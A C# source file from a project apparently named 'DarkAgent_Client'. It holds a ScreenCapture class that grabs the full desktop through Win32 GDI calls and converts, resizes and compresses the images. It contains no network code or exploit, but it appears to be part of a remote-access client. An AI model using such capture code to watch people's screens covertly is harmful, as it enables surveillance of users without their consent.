using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Drawing.Drawing2D;
using System.Security.Cryptography;

namespace DarkAgent_Client.src.Objects
{
    public class ScreenCapture
    {
        public static byte[] BitmapToBytes(Bitmap image)
        {
            MemoryStream stream = new MemoryStream();
            image.Save(stream, ImageFormat.Jpeg);
            byte[] Bytes = stream.GetBuffer();
            stream.Close();
            return Bytes;
        }
        public static byte[] BitmapToBytes(Image image)
        {
            MemoryStream stream = new MemoryStream();
            image.Save(stream, ImageFormat.Jpeg);
            byte[] Bytes = stream.GetBuffer();
            image.Dispose();
            stream.Close();
            return Bytes;
        }

        public static Bitmap resizeImage(Bitmap imgToResize, Size size)
        {
            int sourceWidth = imgToResize.Width;
            int sourceHeight = imgToResize.Height;

            float nPercent = 0;
            float nPercentW = 0;
            float nPercentH = 0;

            nPercentW = ((float)size.Width / (float)sourceWidth);
            nPercentH = ((float)size.Height / (float)sourceHeight);

            if (nPercentH < nPercentW)
                nPercent = nPercentH;
            else
                nPercent = nPercentW;

            int destWidth = (int)(sourceWidth * nPercent);
            int destHeight = (int)(sourceHeight * nPercent);

            Bitmap b = new Bitmap(destWidth, destHeight);
            Graphics g = Graphics.FromImage((Image)b);
            g.DrawImage(imgToResize, 0, 0, destWidth, destHeight);
            g.Dispose();
            GC.Collect();
            return b;
        }

        public static ImageCodecInfo GetEncoderInfo(String mimeType)
        {
            int j;
            ImageCodecInfo[] encoders;
            encoders = ImageCodecInfo.GetImageEncoders();
            for (j = 0; j < encoders.Length; ++j)
            {
                if (encoders[j].MimeType == mimeType)
                    return encoders[j];
            }
            return null;
        }
        public static Image CompressImage(Image image, long quality)
        {
            EncoderParameters eps = new EncoderParameters(1);
            eps.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
            ImageCodecInfo ici = GetEncoderInfo("image/png");

            MemoryStream stream = new MemoryStream();
            image.Save(stream, ici, eps);
            return Image.FromStream(stream);
        }

        public static Bitmap CaptureScreen()
        {
            IntPtr handle = User32.GetDesktopWindow();
            IntPtr hdcSrc = User32.GetWindowDC(handle);
            User32.RECT windowRect = new User32.RECT();
            User32.GetWindowRect(handle, ref windowRect);
            int width = (windowRect.right - windowRect.left);
            int height = (windowRect.bottom - windowRect.top);
            IntPtr hdcDest = GDI32.CreateCompatibleDC(hdcSrc);
            IntPtr hBitmap = GDI32.CreateCompatibleBitmap(hdcSrc, width, height);
            IntPtr hOld = GDI32.SelectObject(hdcDest, hBitmap);
            GDI32.BitBlt(hdcDest, 0, 0, width, height, hdcSrc, 0, 0, GDI32.SRCCOPY);
            GDI32.SelectObject(hdcDest, hOld);
            GDI32.DeleteDC(hdcDest);
            User32.ReleaseDC(handle, hdcSrc);
            Bitmap img = Image.FromHbitmap(hBitmap);
            GDI32.DeleteObject(hBitmap);
            GC.Collect();
            return img;
        }
        public class GDI32
        {

            public const int SRCCOPY = 0x00CC0020; // BitBlt dwRop parameter
            [DllImport("gdi32.dll")]
            public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest,
                int nWidth, int nHeight, IntPtr hObjectSource,
                int nXSrc, int nYSrc, int dwRop);
            [DllImport("gdi32.dll")]
            public static extern IntPtr CreateCompatibleBitmap(IntPtr hDC, int nWidth,
                int nHeight);
            [DllImport("gdi32.dll")]
            public static extern IntPtr CreateCompatibleDC(IntPtr hDC);
            [DllImport("gdi32.dll")]
            public static extern bool DeleteDC(IntPtr hDC);
            [DllImport("gdi32.dll")]
            public static extern bool DeleteObject(IntPtr hObject);
            [DllImport("gdi32.dll")]
            public static extern IntPtr SelectObject(IntPtr hDC, IntPtr hObject);
        }
        public class User32
        {
            [StructLayout(LayoutKind.Sequential)]
            public struct RECT
            {
                public int left;
                public int top;
                public int right;
                public int bottom;
            }
            [DllImport("user32.dll")]
            public static extern IntPtr GetDesktopWindow();
            [DllImport("user32.dll")]
            public static extern IntPtr GetWindowDC(IntPtr hWnd);
            [DllImport("user32.dll")]
            public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDC);
            [DllImport("user32.dll")]
            public static extern IntPtr GetWindowRect(IntPtr hWnd, ref RECT rect);
        }
    }
}
